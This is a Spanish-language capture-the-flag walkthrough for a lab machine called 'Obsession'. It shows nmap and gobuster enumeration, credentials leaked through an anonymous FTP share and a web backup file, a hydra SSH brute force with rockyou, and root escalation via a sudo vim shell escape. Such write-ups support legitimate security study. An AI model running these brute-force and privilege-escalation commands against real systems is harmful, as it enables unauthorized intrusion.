---
description: '🧠Dificultad: Muy fácil | 🔓22/07/2025'
---

# Obsession

Realizando un escaneo con `nmap` vemos lo siguiente:

```bash
nmap -sC -sV $IPTARGET
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
|_-rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:05:bd:a9:97:27:a5:ad:46:53:82:15:dd:d5:7a:dd (ECDSA)
|_  256 0e:07:e6:d4:3b:63:4e:77:62:0f:1a:17:69:91:85:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Russoski Coaching
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Para empezar, nos interesa el servicio `FTP` y `HTTP`.

Si accedemos al navegador para ver qué página aloja, nos encontramos con una página de un nutricionista. Si nos vamos al final de la página, encontramos este formulario:

<figure><img src="../../.gitbook/assets/Pasted image 20250722023218.png" alt=""><figcaption></figcaption></figure>

Si mandamos una solicitud, nos redirecciona a la siguiente página

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250722023326.png" alt=""><figcaption></figcaption></figure></div>

cuya URL es

```http
http://172.17.0.2/.formrellyrespexit.html?nombre=example&apellido=example2&telefono=123456&email=example&somatotipo=Hectomorfo&llamada+a+la+accion=CAMBIAR+MI+VIDA+A+MEJOR+AHORA&campaign=BLACKFRIDAY
```

De momento, esto lo dejaremos así. Vamos a ver qué hay en el `FTP` con usuario `anonymous`:

<figure><img src="../../.gitbook/assets/Pasted image 20250722023857.png" alt=""><figcaption></figcaption></figure>

Vemos, primero, una conversación entre pervertidos, y en otro fichero, una lista de cosas pendientes donde menciona que no tiene bien gestionados los permisos, pero eso nos servirá para después.

Ojeando el código `HTML` de la página web, encuentro con este comentario:

```html
<!-- -- Utilizando el mismo usuario para todos mis servicios, podré recordarlo fácilmente ---->
```

Realizando un escaneo de directorios de la web, me encuentro con lo siguiente:

```bash
gobuster dir -u http://$IPTARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 5208]
/backup               (Status: 301) [Size: 309] [--> http://172.17.0.2/backup/]
/important            (Status: 301) [Size: 312] [--> http://172.17.0.2/important/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

En `/backup` tenemos un directory indexing que nos muestra un fichero, `backup.txt`:

```
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

En `/important` hay otro directory indexing, con el fichero `important.md`:

```markdown
-------------------------------------------------------

MANIFIESTO HACKER
La Conciencia de un Hacker 

Uno más ha sido capturado hoy, está en todos los periódicos.

"Joven arrestado en Escándalo de Crimen por Computadora", "Hacker arrestado luego de traspasar las barreras de seguridad de un banco.." 

Malditos muchachos. Todos son iguales. Pero tú, en tu psicologí­a de tres partes y tu tecnocerebro de 1950, has alguna vez observado detrás de los ojos de un Hacker?

Alguna vez te has preguntado qué lo mueve, qué fuerzas lo han formado, cuáles lo pudieron haber moldeado?

Soy un Hacker, entra a mi mundo..

El mÃ­o es un mundo que comienza en la escuela.. Soy más inteligente que la mayorí­a de los otros muchachos, esa basura que ellos nos enseÃ±an me aburre..

Malditos sub realizados. Son todos iguales.

Estoy en la preparatoria. He escuchado a los profesores explicar por decimoquinta vez como reducir una fracción. Yo lo entiendo.

"No, Srta. Smith, no le voy a mostrar mi trabajo, lo hice en mi mente..
"Maldito muchacho. Probablemente se lo copió. Todos son iguales.

Hoy hice un descubrimiento. Encontré una computadora. Espera un momento, esto es lo máximo.
Esto hace lo que yo le pida. Si comete un error es porque yo me equivoqué.

No porque no le gustó.. o se siente amenazada por mí­.. o piensa que soy un engreído.. o no le gusta enseñar y no deberí­a estar aquí­.. Maldito muchacho. Todo lo que hace es jugar. Todos son iguales.

Y entonces ocurrió.. una puerta abierta al mundo.. corriendo a través de las lineas telefónicas como la heroí­na a través de las venas de un adicto, se envía un pulso electrónico, un refugio para las incompetencias del dí­a a dí­a es buscado.. una tabla de salvación es encontrada.

--------------------------------------------------------
```

Una vez tenemos el usuario `russoski`, intentamos acceder por fuerza bruta al `ssh`:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://$IPTARGET
```

```bash
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme
1 of 1 target successfully completed, 1 valid password found
```

Si revisamos los permisos con `sudo -l`, nos encontramos con que tenemos permiso para el binario `/usr/bin/vim`. En [gtfobins](https://gtfobins.github.io/gtfobins) vemos que se puede explotar este binario si tenemos permiso con `sudo`:

```bash
sudo vim -c ':!/bin/sh'
```

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250722031509.png" alt=""><figcaption></figcaption></figure></div>
